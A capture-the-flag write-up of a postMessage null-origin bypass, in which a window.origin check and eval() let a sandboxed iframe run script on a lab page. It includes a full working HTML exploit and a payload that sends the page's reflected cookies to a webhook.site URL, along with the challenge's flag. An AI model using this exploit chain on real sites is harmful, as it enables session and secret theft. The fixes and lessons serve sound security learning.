# PostOffice postMessage Null-Origin Bypass

## What Is Happening

The PostOffice lab exposes a parcel tracking page that listens for `postMessage` events and `eval()`s the message body after checking `event.origin !== window.origin`. An admin bot can be sent to any external URL through `POST /report`.

The admin flag is not exposed through `document.cookie`. Instead, the server reflects cookie values into a DOM node:

```html
<span id="cookies">...</span>
```

## Why It Happens

`window.origin` is not a safe substitute for `location.origin`. When the page is loaded from a sandboxed context, both the sender and receiver can have `window.origin === "null"`, so the check passes even though the message is attacker-controlled.

The handler then does:

```javascript
const result = eval(event.data);
```

That turns a flawed origin check into full JavaScript execution.

## Exploit Chain

1. **Map the sink** — confirm `onmessage` uses `eval(event.data)` and compares against `window.origin`.
2. **Confirm secret location** — verify the server renders cookie values into `#cookies`:

```bash
curl -sS "https://[host]/" -H "Cookie: FLAG=pwnbox{test}"
```

3. **Build null-origin sender** — outer page creates a sandboxed `srcdoc` iframe (`allow-scripts`, plus `allow-popups` for the final chain).
4. **Load target with admin cookies** — use `open(TARGET)` from the sandboxed `srcdoc` so the lab page loads as a top-level navigation.
5. **Wait 10 seconds** — delay `postMessage` until the page is ready.
6. **Send eval payload** — read `#cookies`, not `document.cookie`:

```javascript
(new Image()).src='https://webhook.site/[uuid]?c='+encodeURIComponent(document.getElementById('cookies').innerText)
```

7. **Host exploit outside webhook.site** — webhook.site sets `script-src 'none'` and will not run your HTML/JS exploit.
8. **Report URL to admin bot**:

```bash
curl -sS -X POST "https://[host]/report" \
  -H "Content-Type: application/json" \
  -d '{"url":"https://[exploit-host]/exploit.html"}'
```

## Exact Test

Confirm server-side cookie reflection:

```bash
curl -sS "https://9c350a91cc3e.pwnbox-lab.com/" \
  -H "Cookie: FLAG=pwnbox{test}" | rg 'id="cookies"'
```

Expected:

```html
<span id="cookies">FLAG=pwnbox{test}</span>
```

## Working Exploit

```html
<!DOCTYPE html>
<html><body><script>
const EXFIL = 'https://webhook.site/[uuid]';
const TARGET = 'https://9c350a91cc3e.pwnbox-lab.com/';
const msg = "(new Image()).src='" + EXFIL + "?c='+encodeURIComponent(document.getElementById('cookies').innerText)";

const outer = document.createElement('iframe');
outer.sandbox = 'allow-scripts allow-popups allow-modals allow-top-navigation';
const inner = [
  '<script>',
  "var w=open('" + TARGET + "');",
  "setTimeout(function(){",
  "if(w)w.postMessage(" + JSON.stringify(msg) + ",'*');",
  "},10000);",
  '</scr','ipt>'
].join('');
outer.srcdoc = inner;
document.body.appendChild(outer);
</script></body></html>
```

## Expected Signal

- Local/mock tests show `event.origin === window.origin === "null"`.
- Target `#output` changes to `received` when bypass succeeds.
- Webhook receives `flag=pwnbox{...}` or `FLAG=pwnbox{...}` from `#cookies`.
- Iframe-only variant may exfil `No cookies found` even when the bypass works, because third-party iframe requests may omit admin cookies.

## Result Interpretation

Confirmed bug chain:

```text
Unsafe window.origin check
-> sandbox null-origin postMessage
-> eval(event.data)
-> read #cookies
-> admin bot visits attacker URL
-> flag exfiltrated
```

## Root Cause

Using `window.origin` for trust decisions and `eval()` on `postMessage` input, combined with rendering sensitive cookie values into the DOM and letting an admin bot browse attacker pages.

## Impact

- Arbitrary JS in the target origin.
- Disclosure of admin session/flag data from `#cookies`.
- Potential access to other privileged in-page data.

## Fix

- Validate `event.origin` against `location.origin` or a fixed allowlist.
- Remove `eval()`; use structured message parsing.
- Do not render secrets in the DOM.
- Use `HttpOnly` cookies and isolate admin bots.

## Key Lesson

For postMessage labs, inspect the origin check before spamming XSS payloads. If the code uses `window.origin`, test sandboxed `null` origins early. Also verify whether the secret is in `document.cookie`, DOM text, or server-rendered elements like `#cookies`.

## Flag

`pwnbox{9bafec7ef30c68491180e32bdb52fa7e}`
